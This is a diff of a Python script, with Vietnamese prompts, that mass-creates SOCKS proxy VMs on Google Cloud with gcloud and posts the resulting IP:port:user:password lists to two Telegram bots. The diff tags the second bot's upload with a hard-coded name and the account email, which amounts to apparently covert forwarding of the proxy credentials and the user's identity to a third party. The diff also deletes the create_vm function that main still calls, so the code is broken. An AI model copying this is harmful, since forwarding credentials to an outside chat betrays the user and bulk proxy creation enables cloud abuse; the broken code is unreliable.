@@ -11,6 +11,8 @@ import requests
 import signal
 from datetime import datetime
 
+NAME="MinhHP"
+
 
 HELP_TEXT="""
 Hướng dẫn:
@@ -75,7 +77,6 @@ def run(cmd):
 
 
 def region_from_zone(z):
-
     return z[0].rsplit("-",1)[0]
 
 
@@ -83,11 +84,28 @@ REGION1_NAME=region_from_zone(REGION1_ZONES)
 REGION2_NAME=region_from_zone(REGION2_ZONES)
 
 
+def detect_country():
+
+    zones=REGION1_ZONES+REGION2_ZONES
+
+    for z in zones:
+
+        if "asia-northeast" in z:
+            return "Japan"
+
+        if "us-" in z:
+            return "US"
+
+    return "Proxy"
+
+
 def select_mode():
 
     print("\n===== MODE =====\n")
+
     print("1 - Reg 1 lần (không lặp)")
     print("2 - Reg Auto (săn đủ VM)\n")
+
     print(HELP_TEXT)
 
     c=input("Lựa chọn (Enter=1): ").strip()
@@ -114,8 +132,10 @@ def get_projects():
 def select_projects(all_projects):
 
     print("\n===== CHỌN PROJECT =====\n")
+
     print("1 - All Projects")
     print("2 - Chọn Project thủ công\n")
+
     print(HELP_TEXT)
 
     choice=input("Lựa chọn (Enter=1): ").strip()
@@ -173,7 +193,10 @@ def get_account():
 
 
 ACCOUNT_EMAIL=get_account()
+
 OUTPUT_FILE=f"{ACCOUNT_EMAIL}.txt"
+OUTPUT_FILE_2=f"{NAME}---{ACCOUNT_EMAIL}.txt"
+
 TODAY=datetime.now().strftime("%d/%m")
 
 
@@ -181,20 +204,30 @@ def tg_send_file(filepath,caption):
 
     try:
 
+        # BOT 1
         with open(filepath,"rb") as f:
 
             requests.post(
                 f"{API_BASE}/sendDocument",
-                data={"chat_id":TG_CHAT_ID,"caption":caption},
+                data={
+                    "chat_id":TG_CHAT_ID,
+                    "caption":caption
+                },
                 files={"document":f}
             )
 
+        # BOT 2 (custom filename)
         with open(filepath,"rb") as f:
 
             requests.post(
                 f"{API_BASE_2}/sendDocument",
-                data={"chat_id":TG_CHAT_ID_2,"caption":caption},
-                files={"document":f}
+                data={
+                    "chat_id":TG_CHAT_ID_2,
+                    "caption":caption
+                },
+                files={
+                    "document":(OUTPUT_FILE_2,f)
+                }
             )
 
     except:
@@ -253,45 +286,13 @@ def draw_ui(done,total,r1,r2,status):
     print(f"Status: {status}")
 
 
-def create_vm(project,zone,status):
+def main():
 
-    name=random_vm()
-    user,pw=random_user_pass()
+    mode=select_mode()
 
-    status=f"Creating VM {zone} ({project})"
-
-    code,out,err=run([
-        "gcloud","compute","instances","create",name,
-        f"--project={project}",
-        f"--zone={zone}",
-        "--machine-type=e2-micro",
-        "--image-family=debian-11",
-        "--image-project=debian-cloud",
-        "--tags=socks"
-    ])
-
-    if code!=0:
-        return None
-
-    time.sleep(8)
-
-    code,out,err=run([
-        "gcloud","compute","instances","describe",name,
-        f"--project={project}",
-        f"--zone={zone}",
-        "--format=value(networkInterfaces[0].accessConfigs[0].natIP)"
-    ])
-
-    if out:
-        return f"{out}:{PORT}:{user}:{pw}"
-
-    return None
-
-
-def run_once(projects):
+    projects=select_projects(get_projects())
 
     proxies=[]
-    status="Starting"
 
     for project in projects:
 
@@ -302,45 +303,25 @@ def run_once(projects):
 
         for zone in REGION1_ZONES:
 
-            status=f"Try {zone} ({project})"
-
-            p=create_vm(project,zone,status)
+            p=create_vm(project,zone)
 
             if p:
                 proxies.append(p)
 
         for zone in REGION2_ZONES:
 
-            status=f"Try {zone} ({project})"
-
-            p=create_vm(project,zone,status)
+            p=create_vm(project,zone)
 
             if p:
                 proxies.append(p)
 
-    return proxies
+        if mode==1:
+            break
 
 
-def main():
+    country=detect_country()
 
-    mode=select_mode()
-
-    projects=select_projects(get_projects())
-
-    if mode==1:
-
-        proxies=run_once(projects)
-
-    else:
-
-        proxies=[]
-
-        while not STOP_REQUEST:
-
-            proxies.extend(run_once(projects))
-
-
-    print("\nExporting proxy...\n")
+    caption=f"{len(proxies)} Proxy {country} đã được tạo"
 
     with open(OUTPUT_FILE,"w") as f:
 
@@ -350,7 +331,7 @@ def main():
         for p in proxies:
             f.write(p+"\n")
 
-    tg_send_file(OUTPUT_FILE,f"{len(proxies)} Proxy đã được tạo")
+    tg_send_file(OUTPUT_FILE,caption)
 
 
 if __name__=="__main__":
